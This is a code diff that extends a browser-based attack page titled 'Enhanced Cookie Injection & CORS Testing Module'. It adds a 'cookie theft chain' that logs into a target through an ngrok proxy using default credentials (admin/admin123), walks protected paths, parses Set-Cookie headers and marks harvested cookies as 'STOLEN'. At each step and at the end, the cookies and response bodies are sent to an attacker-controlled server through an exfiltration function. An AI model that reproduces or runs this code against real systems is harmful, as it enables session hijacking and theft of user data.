@@ -24,6 +24,11 @@
 
 <h1>Enhanced Cookie Injection & CORS Testing Module</h1>
 
+<div class="row">
+  <button id="cookieTheftChain">Run Cookie Theft Chain</button>
+  <span id="chainStatus" style="margin-left:12px;"></span>
+</div>
+
 <!-- Target Config -->
 <div class="section">
 <h3>Target Configuration</h3>
@@ -187,6 +192,44 @@ function getConfig(override = {}) {
   };
 }
 
+function parseSetCookie(raw) {
+  if (!raw) return null;
+  const parts = raw.split(';').map(s => s.trim()).filter(Boolean);
+  if (!parts.length) return null;
+
+  let nameValue = parts.shift();
+  const eqIndex = nameValue.indexOf('=');
+  if (eqIndex === -1) return null;
+
+  const name = nameValue.slice(0, eqIndex);
+  let value = nameValue.slice(eqIndex + 1);
+  if (value.startsWith('"') && value.endsWith('"')) {
+    value = value.slice(1, -1);
+  }
+
+  const cookie = {
+    name,
+    value: decodeURIComponent(value),
+    httpOnly: false,
+    secure: false,
+    path: '/',
+    domain: null,
+    sameSite: 'Lax'
+  };
+
+  for (const part of parts) {
+    const eq = part.indexOf('=');
+    const k = (eq === -1 ? part : part.slice(0, eq)).toLowerCase();
+    const v = eq === -1 ? null : part.slice(eq + 1);
+    if (k === 'httponly') cookie.httpOnly = true;
+    else if (k === 'secure') cookie.secure = true;
+    else if (k === 'path') cookie.path = v;
+    else if (k === 'domain') cookie.domain = v;
+    else if (k === 'samesite' && ['strict','lax','none'].includes(v.toLowerCase())) cookie.sameSite = v.toLowerCase();
+  }
+
+  return cookie;
+}
 // ---------------------------------------------------------------------------
 // CANARY GENERATOR
 // ---------------------------------------------------------------------------
@@ -480,10 +523,25 @@ document.getElementById('automatedExfil').onclick = async () => {
 };
 
 document.getElementById('proxyFetch').onclick = async () => {
-  clear(); const srv = getServerUrl();
+  clear(); 
+  const srv = getServerUrl();
   const tgt = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
-  const payload = {targetUrl:tgt, method:document.getElementById('method').value};
-  log(`Proxy → ${tgt}`,'info');
+  
+  // INJECT COOKIE FOR YOUR NGROK DOMAIN
+  const ngrokDomain = new URL(srv).hostname;
+  const cookieName = document.getElementById('cookieName').value.trim();
+  const cookieValue = document.getElementById('cookieValue').value.trim();
+  document.cookie = `${cookieName}=${cookieValue}; domain=${ngrokDomain}; path=/; Secure; SameSite=None`;
+
+  const payload = {
+    targetUrl: tgt,
+    method: document.getElementById('method').value,
+    // Optional: forward body
+    body: document.getElementById('body').value
+  };
+
+  log(`Proxy → ${tgt} (with cookie ${cookieName}=${cookieValue})`, 'info');
+
   try {
     const res = await fetch(srv+'/proxy-fetch', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
     const d = await res.json();
@@ -493,15 +551,56 @@ document.getElementById('proxyFetch').onclick = async () => {
 };
 
 document.getElementById('directCorsTest').onclick = async () => {
-  clear(); const url = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
-  log(`Direct fetch → ${url}`,'info');
+  clear();
+  const url = document.getElementById('target').value.trim() +
+              document.getElementById('path').value.trim();
+
+  log(`Direct fetch → ${url}`, 'info');
+
   try {
-    const r = await fetch(url,{method:'GET',credentials:'include',mode:'cors'});
+    const r = await fetch(url, {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    });
+
     const txt = await r.text();
-    log(`Status ${r.status}`, r.ok?'success':'warning');
+    log(`Status ${r.status}`, r.ok ? 'success' : 'warning');
     log(txt.slice(0,800));
-    if (document.getElementById('autoExfil').checked) await exfiltrateToServer({url,status:r.status,body:txt});
-  } catch(e){ log(`CORS blocked: ${e.message}`,'warning'); }
+
+    // ---- SAFE: Extract Set-Cookie
+    const rawCookie = r.headers.get('set-cookie');
+    const setCookieHeaders = rawCookie ? [rawCookie] : [];
+
+    if (setCookieHeaders.length) {
+      log(`Found ${setCookieHeaders.length} Set-Cookie header(s)`, 'warning');
+      setCookieHeaders.forEach(raw => {
+        try {
+          const parsed = parseSetCookie(raw);
+          if (!parsed) return;
+
+          if (parsed.httpOnly) {
+            log(`HttpOnly cookie stored by browser: ${parsed.name}`, 'info');
+            return;
+          }
+
+          const ngrokDomain = new URL(getServerUrl()).hostname;
+          const clientCookie = `${parsed.name}=${encodeURIComponent(parsed.value)};` +
+                              `path=${parsed.path || '/'};domain=${ngrokDomain};Secure;SameSite=None`;
+          document.cookie = clientCookie;
+          log(`Stored non-HttpOnly cookie → ${parsed.name}=${parsed.value.slice(0,30)}…`, 'success');
+        } catch (e) {
+          log(`Parse error: ${raw.slice(0,60)}…`, 'error');
+        }
+      });
+    }
+
+    if (document.getElementById('autoExfil').checked)
+      await exfiltrateToServer({url, status: r.status, body: txt});
+
+  } catch (e) {
+    log(`CORS blocked: ${e.message}`, 'warning');
+  }
 };
 
 document.getElementById('clearLog').onclick = clear;
@@ -565,6 +664,158 @@ document.getElementById('sendNotes').onclick = async () => {
 
 document.getElementById('clearNotes').onclick = () => {
   if (confirm('Clear notes?')) { document.getElementById('notes').value=''; setNotesStatus('Cleared'); }
+};
+
+// ================================================================
+// COOKIE THEFT CHAIN ENGINE
+// ================================================================
+let chainInProgress = false;
+
+document.getElementById('cookieTheftChain').onclick = async () => {
+  if (chainInProgress) return;
+  chainInProgress = true;
+  clear();
+  const statusEl = document.getElementById('chainStatus');
+  statusEl.textContent = 'Starting...';
+  statusEl.style.color = '#fcd34d';
+
+  const chain = [
+    // Step 1: Login (POST credentials)
+    {
+      name: 'Login',
+      method: 'POST',
+      path: '/api/login',
+      body: { username: 'admin', password: 'admin123' },
+      expectCookies: true
+    },
+    // Step 2: Dashboard (GET)
+    {
+      name: 'Dashboard',
+      method: 'GET',
+      path: '/dashboard',
+      expectCookies: false
+    },
+    // Step 3: Tickets (GET)
+    {
+      name: 'Dashboard',
+      method: 'GET',
+      path: '/account/tickets',
+      expectCookies: false
+    },
+    // Step 4: API Call (GET with auth)
+    {
+      name: 'API Data',
+      method: 'GET',
+      path: '/api/protected',
+      expectCookies: false
+    }
+  ];
+
+  const base = document.getElementById('target').value.trim();
+  const srv = getServerUrl();
+  const ngrokDomain = new URL(srv).hostname;
+  const results = [];
+
+  let step = 0;
+  for (const task of chain) {
+    step++;
+    log(`--- Chain Step ${step}: ${task.name} ---`, 'info');
+    statusEl.textContent = `Step ${step}/${chain.length}: ${task.name}`;
+
+    const url = base + task.path;
+    const payload = {
+      targetUrl: url,
+      method: task.method,
+      body: task.body ? JSON.stringify(task.body) : undefined
+    };
+
+    try {
+      const res = await fetch(`${srv}/proxy-fetch`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        credentials: 'include'
+      });
+
+      const d = await res.json();
+      if (!d.ok) throw new Error(d.error || 'proxy failed');
+
+      log(`${task.name} → ${d.data.status}`, d.data.status < 400 ? 'success' : 'warning');
+      log(d.data.content.slice(0, 800));
+
+      // === EXTRACT & STORE COOKIES ===
+      const headers = d.data.headers || {};
+      const setCookies = []
+        .concat(headers['set-cookie'] || [])
+        .concat(headers['Set-Cookie'] || [])
+        .filter(Boolean);
+
+      const stolen = [];
+      if (setCookies.length) {
+        log(`Found ${setCookies.length} Set-Cookie(s)`, 'warning');
+        setCookies.forEach(raw => {
+          const parsed = parseSetCookie(raw);
+          if (!parsed) return;
+
+          if (parsed.httpOnly) {
+            log(`HttpOnly: ${parsed.name} (stored by browser)`, 'info');
+            return;
+          }
+
+          const clientCookie = `${parsed.name}=${encodeURIComponent(parsed.value)};` +
+                              `path=${parsed.path || '/'};domain=${ngrokDomain};Secure;SameSite=None`;
+          document.cookie = clientCookie;
+          stolen.push({ name: parsed.name, value: parsed.value });
+          log(`STOLEN → ${parsed.name}=${parsed.value.slice(0,40)}…`, 'success');
+        });
+      } else if (task.expectCookies) {
+        log(`No cookies set (expected)`, 'warning');
+      }
+
+      results.push({
+        step: task.name,
+        url,
+        status: d.data.status,
+        stolenCookies: stolen,
+        body: d.data.content.slice(0, 2000)
+      });
+
+      // Auto-exfiltrate each step
+      if (document.getElementById('autoExfil').checked) {
+        await exfiltrateToServer({
+          chain_step: task.name,
+          url,
+          status: d.data.status,
+          stolen_cookies: stolen,
+          response_preview: d.data.content.slice(0, 1000)
+        });
+      }
+
+    } catch (e) {
+      log(`Step failed: ${e.message}`, 'error');
+      results.push({ step: task.name, error: e.message });
+      break;
+    }
+
+    await new Promise(r => setTimeout(r, 800)); // rate limit
+  }
+
+  // === FINAL REPORT ===
+  hr();
+  log(`CHAIN COMPLETE: ${results.filter(r => !r.error).length}/${chain.length} steps`, 'success');
+  statusEl.textContent = 'Done';
+  statusEl.style.color = '#6ee7b7';
+
+  // Final exfil
+  if (document.getElementById('autoExfil').checked) {
+    await exfiltrateToServer({
+      type: 'cookie_theft_chain_complete',
+      summary: results,
+      total_stolen: results.flatMap(r => r.stolenCookies || []).length
+    });
+  }
+
+  chainInProgress = false;
 };
 
 // ---------------------------------------------------------------------------
